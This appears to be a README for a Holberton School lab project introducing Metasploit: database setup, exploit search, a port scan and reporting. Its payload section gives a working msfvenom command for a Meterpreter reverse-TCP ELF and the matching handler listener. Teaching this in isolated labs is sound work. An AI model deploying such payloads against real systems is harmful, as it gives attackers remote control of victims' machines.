# Metasploit Basics - Complete Workflow

## Project Overview

This project provides a comprehensive guide to setting up and using **Metasploit Framework**. It covers installation, basic usage, payload creation, exploration of auxiliary modules, and documentation of findings.

## Learning Objectives

By the end of this project, you will be able to:

1. Familiarize with basic Metasploit commands and workflow to understand how to search for exploits, set payloads, and execute them.
2. Learn how to create a simple payload using `msfvenom` and understand the process of generating and validating payload files.
3. Understand how to search for, configure, and use auxiliary modules in Metasploit, specifically focusing on performing a TCP port scan.
4. Set up and use PostgreSQL with Metasploit to manage data more efficiently, including creating and configuring the database and verifying the connection.
5. Learn how to document findings and create reports in Metasploit by using `notes` and `loot` commands to store data and generate comprehensive reports.

## Project Structure

```
0x03_metasploit_basics/
├── README.md                    # This file
├── metasploit_workflow.sh       # Main workflow script (all 5 parts)
├── notes.csv                    # Generated notes and findings
└── payload.elf                  # Generated payload file
```

## Requirements

- **Operating System**: Kali Linux (or any Linux distribution)
- **Metasploit Framework**: Must be installed
- **PostgreSQL**: Will be installed by the script
- **Root Access**: Required for installation and configuration
- **Network**: Internet connection for package installation

## Installation

### Install Metasploit Framework

If Metasploit is not already installed:

```bash
# On Kali Linux (usually pre-installed)
apt-get update
apt-get install metasploit-framework

# Or follow official installation guide:
# https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html
```

### Verify Installation

```bash
msfconsole --version
```

## Usage

### Running the Script

The script must be run with **root privileges**:

```bash
sudo ./metasploit_workflow.sh
```

### Workflow Execution

The script executes all 5 parts sequentially with interactive prompts:

1. **Part 1**: Setup PostgreSQL database for Metasploit
2. **Part 2**: Demonstrate basic Metasploit usage (exploit search, configuration)
3. **Part 3**: Generate a Meterpreter payload with msfvenom
4. **Part 4**: Execute TCP port scan using auxiliary module
5. **Part 5**: Document all findings to notes.csv

Each part includes educational explanations and waits for user confirmation before proceeding.

## Project Parts Explained

### Part 1: Setup Metasploit with PostgreSQL

**Objective**: Set up Metasploit with PostgreSQL to manage data efficiently.

**Steps**:
1. Install PostgreSQL and dependencies
2. Start PostgreSQL service
3. Create PostgreSQL user (`msf_user`)
4. Create PostgreSQL database (`msf_database`)
5. Initialize Metasploit database
6. Verify database connection

**What it does**:
- Installs and configures PostgreSQL
- Creates dedicated database for Metasploit
- Enables efficient data storage and retrieval
- Improves Metasploit performance

### Part 2: Basic Usage of Metasploit

**Objective**: Familiarize with basic Metasploit commands and workflow.

**Steps**:
1. Start Metasploit console
2. Search for exploits (example: `vsftpd`)
3. Select an exploit
4. Configure exploit options (RHOSTS)
5. Show available payloads
6. Set payload
7. Understand the exploitation workflow

**What it does**:
- Demonstrates exploit search and selection
- Shows how to configure exploit parameters
- Explains payload selection
- Provides understanding of the attack workflow

### Part 3: Create and Use a Simple Payload

**Objective**: Create custom payloads using `msfvenom`.

**Steps**:
1. Generate a payload using `msfvenom`
2. Specify payload parameters:
   - Type: `linux/x86/meterpreter/reverse_tcp`
   - LHOST: Local IP address
   - LPORT: Local port (default: 4444)
   - Format: ELF executable
3. Validate the generated payload
4. Understand payload execution

**Generated File**: `payload.elf`

**Command Example**:
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp \
    LHOST=10.0.2.15 \
    LPORT=4444 \
    -f elf \
    -o payload.elf
```

**Usage**:
```bash
# Set up listener on attacker machine
msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp; set LHOST 10.0.2.15; set LPORT 4444; exploit"

# On target machine (for testing purposes only)
chmod +x payload.elf
./payload.elf
```

### Part 4: Explore Auxiliary Modules

**Objective**: Learn about auxiliary modules for reconnaissance and scanning.

**Steps**:
1. Search for auxiliary modules (port scanners)
2. Select `auxiliary/scanner/portscan/tcp`
3. Configure module options (RHOSTS, PORTS, THREADS)
4. Execute the module
5. Analyze results

**What it does**:
- Performs TCP port scanning
- Identifies open ports on target systems
- Demonstrates non-exploit modules
- Shows reconnaissance capabilities

**Default Scanned Ports**: 21, 22, 23, 25, 80, 443, 3306, 8080

### Part 5: Documentation and Reporting

**Objective**: Document findings and generate reports using Metasploit.

**Steps**:
1. Document all activities performed during the workflow
2. Generate CSV report with findings
3. Create comprehensive documentation

**Generated File**:
- `notes.csv`: Detailed findings and activities in CSV format

**CSV Format**:
```csv
Time,Host,Service,Port,Protocol,Type,Data
```

## Generated Files

### notes.csv

Contains detailed documentation of all security findings and activities:
- Timestamps
- Host IP
- Service discovered
- Port number
- Protocol
- Type of finding
- Data/Description

**Format**:
```csv
Time,Host,Service,Port,Protocol,Type,Data
2024-01-14 10:16:00,192.168.56.100,postgresql,5432,tcp,setup,"PostgreSQL database setup"
2024-01-14 10:20:00,192.168.56.100,portscan,21,tcp,scan_config,"TCP port scan configured"
2024-01-14 10:25:00,192.168.56.100,meterpreter,4444,tcp,payload,"Generated linux/x86/meterpreter/reverse_tcp"
```

### payload.elf

A generated Meterpreter reverse TCP payload:
- **Type**: Linux x86 ELF executable
- **Payload**: `linux/x86/meterpreter/reverse_tcp`
- **Purpose**: Educational demonstration of payload creation
- **Warning**: Only use in authorized testing environments

## Important Notes

### Security and Ethics

**WARNING**: This project is for **educational purposes only**.

- Only use Metasploit in **authorized testing environments**
- Never perform attacks on systems without **explicit permission**
- Unauthorized access to computer systems is **illegal**
- Use this knowledge **responsibly and ethically**

### Best Practices

1. **Always get written authorization** before testing
2. **Use isolated lab environments** for practice
3. **Document everything** you do
4. **Follow responsible disclosure** if you find vulnerabilities
5. **Stay within legal boundaries**

### Troubleshooting

#### Metasploit Not Found
```bash
apt-get update
apt-get install metasploit-framework
```

#### PostgreSQL Connection Issues
```bash
systemctl restart postgresql
msfdb reinit
```

#### Permission Denied
```bash
# Make script executable
chmod +x metasploit_workflow.sh

# Run with sudo
sudo ./metasploit_workflow.sh
```

#### Database Initialization Fails
```bash
# Manually reinitialize
msfdb delete
msfdb init
```

## Additional Resources

### Official Documentation
- [Metasploit Framework Documentation](https://docs.metasploit.com/)
- [Metasploit Unleashed (Free Training)](https://www.offensive-security.com/metasploit-unleashed/)
- [Rapid7 Metasploit](https://www.rapid7.com/products/metasploit/)

### Useful Commands

```bash
# Start Metasploit console
msfconsole

# Update Metasploit
msfupdate

# Check database status
msfconsole -q -x "db_status; exit"

# Search for modules
msfconsole -q -x "search <keyword>; exit"

# Generate payloads
msfvenom -l payloads          # List all payloads
msfvenom -l formats           # List output formats
msfvenom -l encoders          # List encoders
```

### Common Metasploit Commands

```bash
# Inside msfconsole
search <keyword>              # Search for modules
use <module>                  # Select a module
show options                  # Display module options
set <option> <value>          # Set an option
show payloads                 # Display available payloads
exploit or run                # Execute the module
back                          # Go back to previous context
exit                          # Exit Metasploit
```

## Testing Environment Recommendations

### Virtual Lab Setup
1. **Attacker Machine**: Kali Linux
2. **Target Machines**:
   - Metasploitable 2 or 3
   - DVWA (Damn Vulnerable Web Application)
   - Vulnerable VMs from VulnHub

### Network Isolation
- Use **NAT or Host-Only networks**
- **Never connect vulnerable VMs** to the internet
- Use **VirtualBox or VMware** for isolation

## Project Completion Checklist

- [ ] Part 1: PostgreSQL setup completed
- [ ] Part 2: Basic Metasploit usage demonstrated
- [ ] Part 3: Payload generated successfully (`payload.elf`)
- [ ] Part 4: Auxiliary module scan executed
- [ ] Part 5: Documentation completed (`notes.csv`)
- [ ] README.md reviewed and understood

## Repository Information

- **Repository**: holbertonschool-cyber_security
- **Directory**: vulnerability_research_exploitation/0x03_metasploit_basics
- **Files**:
  - `metasploit_workflow.sh` (Main script)
  - `notes.csv` (Generated documentation)
  - `payload.elf` (Generated payload)

## Author

Holberton School - Cybersecurity Program

## License

This project is for educational purposes as part of the Holberton School Cybersecurity curriculum.

---

**Remember**: With great power comes great responsibility. Use these skills ethically and legally.